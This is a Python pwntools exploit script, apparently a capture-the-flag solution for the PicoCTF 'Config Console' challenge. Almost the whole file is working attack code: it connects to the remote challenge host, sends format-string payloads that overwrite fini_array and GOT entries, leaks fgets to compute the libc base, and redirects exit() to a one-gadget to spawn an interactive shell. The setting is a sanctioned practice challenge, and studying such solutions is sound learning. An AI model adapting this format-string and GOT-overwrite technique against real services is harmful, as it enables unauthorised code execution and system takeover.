#! /usr/bin/env python3
##
# Script for PicoCTF Config Console challenge
# Created by Amos (LFlare) Ng
# With advisories from b0bb :D
##
from pwn import *

# Define absolute addresses we get from GOT by
# looking through GDB and calculations
FINI  = 0x601008   # the absolute location to the fini_array of function pointers run before exit() (get this from readelf -a ./console)
GOT   = 0x601230   # the absolute location to the fgets() pointer in GOT (we leak this)
FGETS = 0x069df0   # the offset of fgets from the libc base (used to calculate libc base from our fgets() leak), for the remote libc
EXIT  = 0x601258   # the absolute location of exit() pointer in GOT (we write over this)
MAGIC = 0x0d6e77   # the offset (from libc base) of a special super secret magic gadget to get a shell with a single address in remote libc
#MAGIC = 0x06b816
# Create a tube connection
t = remote('shell2017.picoctf.com', 27124)
#t = process(['/home/h11p/hackme/console','log'])
t.readuntil('Config action: ')

# Here we write the lower bit address of main() into
# the fini_array while the exit address is for later.
payload = "e %2765u%17$hn__%18$s..." + (p64(FINI) +
                                        p64(GOT) +
                                        p64(EXIT) +
                                        p64(EXIT+2)).decode()
t.sendline(payload)
t.recvuntil('__')

# Since ASLR is enabled, we need to get fget address again
leak   = u64(t.recvuntil('Config action: ').strip()[0:6] +
             '\x00\x00'.encode())
libc   = leak - FGETS
magic  = libc + MAGIC
 
# confirm we have good adresses
log.info('printf(): 0x%016x' % leak)
log.info('libc:     0x%016x' % libc)
log.info('magic:    0x%016x' % magic)
 
# now we write to those 2 exit pointers we setup earlier, we write over the 3 least significant bytes, first we write 2 bytes and then a single byte
# the __%52$s thing is so we can leak what we wrote, just to confirm, makes it easier to debug remotely
payload = ("e %" +
           str(magic & 0xffff) +
           "u%52$hn%" +
           str(0x100 - (magic & 0xff)) +
           "u%"+str((magic >> 16) & 0xff) +
           "u%53$hhn__%52$s")
t.sendline(payload)
t.recvuntil('__')
 
# this value should match the "magic:" line above
log.success("Please test if shell has spawned")
t.interactive()
